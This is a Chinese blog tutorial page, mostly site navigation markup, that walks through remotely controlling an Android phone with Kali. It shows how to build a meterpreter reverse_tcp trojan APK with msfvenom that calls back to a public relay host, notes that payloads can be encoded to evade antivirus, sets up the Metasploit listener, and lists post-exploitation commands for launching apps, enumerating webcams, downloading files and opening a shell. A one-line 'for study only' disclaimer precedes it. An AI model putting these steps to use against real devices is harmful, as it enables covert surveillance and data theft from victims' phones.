+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/小程序/微信小程序/01什么是小程序.html" class="nav-link">
+  微信小程序
+</a></li></ul></li><li class="dropdown-item"><h4>
+          c之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/c语言/安装devc++.html" class="nav-link">
+  c语言
+</a></li></ul></li><li class="dropdown-item"><h4>
+          C++之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/C++语言/01我的第一个C++程序/01如何创建工程.html" class="nav-link">
+  C++
+</a></li></ul></li><li class="dropdown-item"><h4>
+          db之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/db/mysql/mysql数据库总结/01添加唯一索引程序在添加数据.html" class="nav-link">
+  mysql实验总结
+</a></li></ul></li><li class="dropdown-item"><h4>
+          rust之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/rust语言/第一阶段基础篇/01rust是什么.html" class="nav-link">
+  第一阶段基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          python之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/python/第一阶段基础/01python的安装.html" class="nav-link">
+  第一阶段基础
+</a></li><li class="dropdown-subitem"><a href="/lyp/python/jupyter/demo01_2025_03_19_01.html" class="nav-link">
+  第二阶段基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          android之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/android/kotlin/demo01_2025_02_21.html" class="nav-link">
+  kotlin&amp;android
+</a></li></ul></li><li class="dropdown-item"><h4>
+          初见Go，星河初转。
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/go/demo01_2025_03_22_01.html" class="nav-link">
+  web华山论剑
+</a></li></ul></li><li class="dropdown-item"><h4>
+          再探前端，万籁生云。
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/前端/vue/demo01-20250430-01.html" class="nav-link">
+  vue转乾坤
+</a></li><li class="dropdown-subitem"><a href="/lyp/前端/layout/demo01_2025_04_23_01.html" class="nav-link">
+  风云涌动
+</a></li><li class="dropdown-subitem"><a href="/lyp/前端/base/demo01_20250527_01.html" class="nav-link">
+  前端基础
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="大数据" class="dropdown-title"><span class="title">大数据</span> <span class="arrow down"></span></button> <button type="button" aria-label="大数据" class="mobile-dropdown-title"><span class="title">大数据</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          hadoop基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/hadoop基本概念/阶段一/01MapReduce是什么.html" class="nav-link">
+  MapReduce理论
+</a></li></ul></li><li class="dropdown-item"><h4>
+          spark
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/02spark/01Spark集群安装与部署.html" class="nav-link">
+  spark集群
+</a></li><li class="dropdown-subitem"><a href="/lyp/大数据/scala语言基础/01scala简介.html" class="nav-link">
+  scala语言基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          zookeepre
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/zookeeper/01Zookeeper分布式集群部署.html" class="nav-link">
+  zookeepre集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          kafka
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/kafka/01Kafka集群部署与测试.html" class="nav-link">
+  kafka集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          大话flume
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/flume/base01/版本管理.html" class="nav-link">
+  flume
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="美工" class="dropdown-title"><span class="title">美工</span> <span class="arrow down"></span></button> <button type="button" aria-label="美工" class="mobile-dropdown-title"><span class="title">美工</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Adobe Photoshop
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/ps/01ps基础/01巧记ps快捷键.html" class="nav-link">
+  pa基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          office
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/word/practical/demo01_2025_10_10_01.html" class="nav-link">
+  word实用
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Adobe Premiere Pro
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/pr/practical/demo01_2025_10_10_01.html" class="nav-link">
+  pr实用
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="基础科学" class="dropdown-title"><span class="title">基础科学</span> <span class="arrow down"></span></button> <button type="button" aria-label="基础科学" class="mobile-dropdown-title"><span class="title">基础科学</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          数学之美
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/基础科学/数学基础/02中等数学思想/球体体积公式推过程.html" class="nav-link">
+  中等数学思想
+</a></li></ul></li><li class="dropdown-item"><h4>
+          物理电学
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/基础科学/physical_base/middle_school_stage/demo01_2025_03_01.html" class="nav-link">
+  中等电学思想
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈架构" class="dropdown-title"><span class="title">谈架构</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈架构" class="mobile-dropdown-title"><span class="title">谈架构</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          云计算
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/cloud/demo01_2025_03_19_01.html" class="nav-link">
+  云原生
+</a></li></ul></li><li class="dropdown-item"><h4>
+          web架构
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/web/demo01_2025_04_01_01.html" class="nav-link">
+  web认证流程
+</a></li></ul></li><li class="dropdown-item"><h4>
+          人工智能
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/Introduction_to_Deep_Learning_4/chapter_01_20250601_01.html" class="nav-link">
+  深度学习入门
+</a></li></ul></li><li class="dropdown-item"><h4>
+          计算机组成原理
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/system_book01/chapter_01_20250601_0101.html" class="nav-link">
+  深入理解计算机操作系统
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Aiot
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/iot/emqx/demo01_2015_10_10_01.html" class="nav-link">
+  emqx
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈游戏" class="dropdown-title"><span class="title">谈游戏</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈游戏" class="mobile-dropdown-title"><span class="title">谈游戏</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          第一步
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/game/unity_book01/demo01_2025_08_23_01.html" class="nav-link">
+  启蒙之书
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈前端" class="dropdown-title"><span class="title">谈前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈前端" class="mobile-dropdown-title"><span class="title">谈前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          前端学习
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/roadmap/demo01_2025_10_02_01.html" class="nav-link">
+  学习路线
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搭建骨架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/html/demo01_2025_10_01_01.html" class="nav-link">
+  html初级之入路
+</a></li></ul></li><li class="dropdown-item"><h4>
+          外部装饰
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/css_basic/demo01_2025_10_01_01.html" class="nav-link">
+  css初级之入路
+</a></li></ul></li><li class="dropdown-item"><h4>
+          nuxt官方文档
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/nuxt_basic/demo01_2025_10_22_01.html" class="nav-link">
+  nuxt官方文档
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="数据库" class="dropdown-title"><span class="title">数据库</span> <span class="arrow down"></span></button> <button type="button" aria-label="数据库" class="mobile-dropdown-title"><span class="title">数据库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/db/redis/demo01_2025_10_09_01.html" class="nav-link">
+  redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          postgre数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/db/postgre_sql_book/demo01_2025_10_10_01.html" class="nav-link">
+  postgre初级
+</a></li><li class="dropdown-subitem"><a href="/db/postgre_base_db/demo01_2025_10_10_01.html" class="nav-link">
+  postgre初级实战
+</a></li></ul></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>ip地址说起</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/network01.html" class="sidebar-link">ip地址是怎么划分的呢</a></li><li><a href="/network/network02.html" class="sidebar-link">ip地址案例</a></li><li><a href="/network/network03.html" class="sidebar-link">网络地址转换NAT技术</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>华为HCIA</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/华为/HCIA认证/01华为认证体系介绍.html" class="sidebar-link">华为认证体系介绍</a></li><li><a href="/network/华为/HCIA认证/02eNSP的安装.html" class="sidebar-link">eNSP的安装</a></li><li><a href="/network/华为/HCIA认证/03配置ssh协议.html" class="sidebar-link">配置ssh协议</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>windows安全</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/security/windows/win10绕过密码.html" class="sidebar-link">windows10密码绕过流程漏洞</a></li><li><a href="/network/security/windows/demo01_2025_11_18_01.html" class="sidebar-link">电脑进入bios的常用组合键</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>tcp</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/tcp/01tcp.html" class="sidebar-link">TCP缘起</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>jwt</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/jwt/01什么是jwt.html" class="sidebar-link">为什么有JWT的出现？</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>nmap实战</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/nmap/demo01_2025_11_11_01.html" class="sidebar-link">nmap局域网网段扫描</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>密码破解实战</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/password/demo01_2025_11_11_01.html" class="sidebar-link">kali破解pdf文件密码</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Metasploit(MSF)实战</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/network/msf/demo01_2025_11_11_01.html" aria-current="page" class="active sidebar-link">kali远程监控安卓手机</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实验猜想" class="sidebar-link">实验猜想</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实验材料准备" class="sidebar-link">实验材料准备</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第1步-配置内网映射" class="sidebar-link">实现第1步)配置内网映射</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第2步-配置kali的网络模式" class="sidebar-link">实现第2步)配置kali的网络模式</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第3步-使用msf生成木马" class="sidebar-link">实现第3步)使用msf生成木马</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第4步-打开监听器" class="sidebar-link">实现第4步)打开监听器</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第5步-配置并启动反向tcp监听器" class="sidebar-link">实现第5步)配置并启动反向TCP监听器</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#实现第6步-执行攻击命令" class="sidebar-link">实现第6步)执行攻击命令</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#法律责任分析" class="sidebar-link">法律责任分析</a></li><li class="sidebar-sub-header"><a href="/network/msf/demo01_2025_11_11_01.html#法律依据" class="sidebar-link">法律依据</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="kali远程监控安卓手机"><a href="#kali远程监控安卓手机" class="header-anchor">#</a> kali远程监控安卓手机</h1> <p>声明：此篇文章只用于学习与讨论。</p> <p><img src="/assets/img/image-20251123192245591.5e3d7050.jpg" alt="image-20251123192245591"></p> <h2 id="实验猜想"><a href="#实验猜想" class="header-anchor">#</a> 实验猜想</h2> <p>通过客户端手机安装木马程序来控制实验思路。</p> <p><img src="/assets/img/image-20251127154604775.1570b606.png" alt="image-20251127154604775"></p> <p>实验猜想想法是可以实现的，下面有实战实现步骤。</p> <h2 id="实验材料准备"><a href="#实验材料准备" class="header-anchor">#</a> 实验材料准备</h2> <ul><li>一台安卓版本小10的安卓机。本人用的是安卓9。大于10的版本本人没有验证。（高版本可能这个漏洞已经修复了。）</li> <li>一台电脑。可以安装kali的虚拟机。或者直接物理机安装kali。（怎么在物理机上安装kali？可以去关注官方doc）</li> <li>一台公网的跳板机。（利用公网ip地址转发数据包）</li></ul> <h2 id="实现第1步-配置内网映射"><a href="#实现第1步-配置内网映射" class="header-anchor">#</a> 实现第1步)配置内网映射</h2> <p>目的：实现用户通过公网ip地址可以访问内网的服务。</p> <p>工具：github上有大量这样开源免费的内网映射工具。</p> <ul><li><strong>nps</strong>支持 P2P 模式。</li> <li>**frp (Fast Reverse Proxy)**功能强大。</li> <li><strong>ngrok</strong></li> <li>等</li></ul> <h2 id="实现第2步-配置kali的网络模式"><a href="#实现第2步-配置kali的网络模式" class="header-anchor">#</a> 实现第2步)配置kali的网络模式</h2> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>└─<span class="token comment"># ip addr</span>
+<span class="token number">1</span>: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="token number">1000</span>
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet <span class="token number">127.0</span>.0.1/8 scope <span class="token function">host</span> lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope <span class="token function">host</span> 
+       valid_lft forever preferred_lft forever
+<span class="token number">2</span>: eth0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1500</span> qdisc fq_codel state UP group default qlen <span class="token number">1000</span>
+    link/ether 00:0c:29:00:75:d1 brd ff:ff:ff:ff:ff:ff
+    inet <span class="token number">192.168</span>.1.3/24 brd <span class="token number">192.168</span>.1.255 scope global dynamic eth0
+       valid_lft 77512sec preferred_lft 77512sec
+    inet6 <span class="token number">2409</span>:8a38:a022:55b0:20c:29ff:fe00:75d1/64 scope global dynamic mngtmpaddr 
+       valid_lft 86391sec preferred_lft 14391sec
+    inet6 fe80::20c:29ff:fe00:75d1/64 scope <span class="token function">link</span> 
+       valid_lft forever preferred_lft forever
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h2 id="实现第3步-使用msf生成木马"><a href="#实现第3步-使用msf生成木马" class="header-anchor">#</a> 实现第3步)使用msf生成木马</h2> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>msfvenom <span class="token parameter variable">-p</span> android/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>公网ip地址 <span class="token assign-left variable">lport</span><span class="token operator">=</span>公网的端口号 R <span class="token operator">&gt;</span> ./gwmuma.apk
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>lhost：暴露给移动端应用访问的ip地址。</li> <li>lport：暴露给移动端应用访问的端口号。</li> <li>R &gt; ./gwmuma.apk：表示将木马包生成到那个目录下。</li></ul> <p><code>msfvenom</code> 是什么意思？</p> <p><strong><code>msfvenom</code></strong> 是渗透测试框架 <strong>Metasploit</strong> 中的一个重要工具。</p> <ul><li><strong>Metasploit</strong>：一个功能极其强大的开源渗透测试平台，它提供了大量关于安全漏洞的信息，并包含了用于开发和执行攻击代码的工具。</li> <li><strong><code>msfvenom</code></strong> 的角色：它是 Metasploit 的<strong>载荷生成器和编码器</strong>。它的主要作用是：
+<ul><li><strong>生成载荷</strong>：根据指定的漏洞或平台，创建可执行的恶意代码（即“木马”或“后门”）。</li> <li><strong>编码载荷</strong>：对生成的载荷进行混淆处理，以绕过杀毒软件（AV）和入侵检测系统（IDS）的查杀。</li></ul></li></ul> <p>简单来说，<strong><code>msfvenom</code> 就是一个专门用来制造“木马程序”的工具。</strong></p> <p><code>-p</code> 表示什么？</p> <p><strong><code>-p</code></strong> 是 <code>msfvenom</code> 命令的一个选项，全称是 <strong><code>--payload</code></strong>。</p> <p>它的作用是 <strong>指定要使用的有效载荷</strong>。</p> <p>在您的命令中：</p> <ul><li><code>-p android/meterpreter/reverse_tcp</code></li> <li>这表示：<strong>为 Android 平台生成一个 <code>meterpreter</code> 的 <code>reverse_tcp</code> 载荷。</strong></li></ul> <p>再深入理解这个载荷：</p> <ul><li><strong><code>android/</code></strong>： 指定目标平台是 Android 系统。</li> <li><strong><code>meterpreter/</code></strong>： 这是 Metasploit 的一种高级、动态、可扩展的载荷。它运行在目标机器上，提供了一个强大的交互式命令行界面，<strong>攻击者</strong>可以通过它执行各种操作（如<strong>文件上传下载</strong>、拍照、录音、<strong>获取定位</strong>等）。</li> <li><strong><code>reverse_tcp</code></strong>： 指定连接方式为“反向 TCP 连接”。意思是，被植入木马的 Android 手机会主动去连接攻击者控制的服务器，而不是攻击者去连接手机。这种方式通常更容易<strong>绕过防火墙</strong>。</li></ul> <p><strong>总结：<code>-p</code> 就是用来告诉 <code>msfvenom</code>：“我要生成一个什么类型的木马”。</strong></p> <h2 id="实现第4步-打开监听器"><a href="#实现第4步-打开监听器" class="header-anchor">#</a> 实现第4步)打开监听器</h2> <p>打开监听程序：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>use exploit/multi/handler
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="实现第5步-配置并启动反向tcp监听器"><a href="#实现第5步-配置并启动反向tcp监听器" class="header-anchor">#</a> 实现第5步)配置并启动反向TCP监听器</h2> <p>实现第4步)打开监听器</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">set</span> payload android/meterpreter/reverse_tcp
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>设置攻击者的ip地址：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.3
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>注意：这里我配置的是内网地址因为我配置了端口映射。</p> <p>设置攻击者的端口号：</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token builtin class-name">set</span> lport <span class="token number">7777</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>运行进行监听</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>run
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>为什么要做这一步呢？</strong></p> <p>技术层面的详细解释</p> <p>现在我们把比喻翻译成技术语言：</p> <ul><li><strong>处理器需要知道如何沟通</strong>：Metasploit的 <code>multi/handler</code> 是一个监听模块，它本身是“通用”的。它可以处理各种不同类型的连接（Windows、Linux、Android等）。通过 <code>set payload</code>，你告诉这个通用的处理器：“请专门准备好解析来自 <code>android/meterpreter/reverse_tcp</code> 这种类型载荷的连接数据包。” 如果你不设置，处理器就不知道该如何与上线的目标会话进行交互。</li> <li><strong>载荷需要知道回连地址</strong>：你生成的APK文件（木马）里已经硬编码了回连的IP和端口。监听端<strong>必须使用完全相同的IP和端口</strong>来等待连接。如果监听端设置的 <code>lhost</code> 和 <code>lport</code> 与APK文件里的不一致，那就好比：
+<ul><li><strong>木马APK</strong>： “我要去 43.136.124.89 的 9004 号门找你。”</li> <li><strong>监听端</strong>： “我在 192.168.1.100 的 8080 号门等你。”
+结果就是两者永远无法建立连接。</li></ul></li> <li><strong><code>run</code> 是最终的启动命令</strong>：在Metasploit中，<code>show options</code> 可以查看设置，<code>set</code> 命令只是修改内存中的配置变量。只有执行 <code>run</code>（或者等价的 <code>exploit</code>）命令，才会真正地<strong>根据你设置的所有参数，启动这个模块的功能</strong>——在这里就是开始网络监听。</li></ul> <div class="custom-block tip"><p class="custom-block-title">整个攻击流程的串联</p> <ol><li><strong>攻击者端（你）</strong>：
+<ul><li>步骤A：用 <code>msfvenom</code> <strong>生成</strong>一个陷阱（APK木马），并在制作时写明：“踩中后，请到 <code>43.136.124.89:9004</code> 找我。”</li> <li>步骤B：在Metasploit中<strong>设置</strong>监听模块，选择陷阱类型（payload），并确认自己的地址（lhost, lport）。</li> <li>步骤C：执行 <code>run</code>，<strong>启动</strong>监听。</li></ul></li> <li><strong>目标端（受害者）</strong>：
+<ul><li>安装并运行了 <code>gwmuma.apk</code>。</li> <li>APK在后台执行，它会尝试向 <code>43.136.124.89:9004</code> 发起一个TCP连接。</li></ul></li> <li><strong>连接建立</strong>：
+<ul><li>你的监听器在 <code>43.136.124.89:9004</code> 收到了这个连接请求。</li> <li>因为监听器已经预先设置好了如何与这种特定的Android反向TCP载荷通信，所以它会成功建立一个 <code>meterpreter</code> 会话。</li> <li>此时，你就在你的控制台获得了对目标手机的一个远程控制通道。</li></ul></li></ol> <p><strong>总结：<code>run</code> 之前的设置步骤，就是在为接下来的监听行动准备一个“精确的蓝图”。没有这个蓝图，监听器就不知道要做什么、在哪里做、以及怎么做。</strong></p></div> <h2 id="实现第6步-执行攻击命令"><a href="#实现第6步-执行攻击命令" class="header-anchor">#</a> 实现第6步)执行攻击命令</h2> <p>查看中木马的用户手机上的app列表信息</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>app_list
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>打开qq</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>app_run  com.tencent.mobileqq
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>查看有哪些摄像头？</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>webcam_list
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-shell line-numbers-mode"><pre class="language-shell"><code>Core Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    <span class="token function">bg</span>                        Alias <span class="token keyword">for</span> background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session <span class="token punctuation">(</span>for http/https<span class="token punctuation">)</span>
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    <span class="token builtin class-name">exit</span>                      Terminate the meterpreter session
+    get_timeouts              Get the current session <span class="token function">timeout</span> values
+    guid                      Get the session GUID
+    <span class="token builtin class-name">help</span>                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or <span class="token function">more</span> meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    <span class="token builtin class-name">read</span>                      Reads data from a channel
+    resource                  Run the commands stored <span class="token keyword">in</span> a <span class="token function">file</span>
+    run                       Executes a meterpreter script or Post module
+    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session <span class="token function">timeout</span> values
+    <span class="token function">sleep</span>                     Force Meterpreter to go quiet, <span class="token keyword">then</span> re-establish session
+    transport                 Manage the transport mechanisms
+    use                       Deprecated <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> <span class="token string">&quot;load&quot;</span>
+    uuid                      Get the UUID <span class="token keyword">for</span> the current session
+    <span class="token function">write</span>                     Writes data to a channel
+
+
+Stdapi: File system Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command       Description
+    -------       -----------
+    <span class="token function">cat</span>           Read the contents of a <span class="token function">file</span> to the <span class="token function">screen</span>
+    <span class="token builtin class-name">cd</span>            Change directory
+    checksum      Retrieve the checksum of a <span class="token function">file</span>
+    <span class="token function">cp</span>            Copy <span class="token builtin class-name">source</span> to destination
+    del           Delete the specified <span class="token function">file</span>
+    <span class="token function">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> <span class="token function">ls</span><span class="token punctuation">)</span>
+    download      Download a <span class="token function">file</span> or directory
+    edit          Edit a <span class="token function">file</span>
+    getlwd        Print <span class="token builtin class-name">local</span> working directory
+    getwd         Print working directory
+    lcat          Read the contents of a <span class="token builtin class-name">local</span> <span class="token function">file</span> to the <span class="token function">screen</span>
+    lcd           Change <span class="token builtin class-name">local</span> working directory
+    lls           List <span class="token builtin class-name">local</span> files
+    lpwd          Print <span class="token builtin class-name">local</span> working directory
+    <span class="token function">ls</span>            List files
+    <span class="token function">mkdir</span>         Make directory
+    <span class="token function">mv</span>            Move <span class="token builtin class-name">source</span> to destination
+    <span class="token builtin class-name">pwd</span>           Print working directory
+    <span class="token function">rm</span>            Delete the specified <span class="token function">file</span>
+    <span class="token function">rmdir</span>         Remove directory
+    search        Search <span class="token keyword">for</span> files
+    upload        Upload a <span class="token function">file</span> or directory
+
+
+Stdapi: Networking Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    <span class="token function">ifconfig</span>      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a <span class="token builtin class-name">local</span> port to a remote <span class="token function">service</span>
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    execute       Execute a <span class="token builtin class-name">command</span>
+    getenv        Get one or <span class="token function">more</span> environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    localtime     Displays the target system <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span>
+    pgrep         Filter processes by name
+    <span class="token function">ps</span>            List running processes
+    shell         Drop into a system <span class="token builtin class-name">command</span> shell
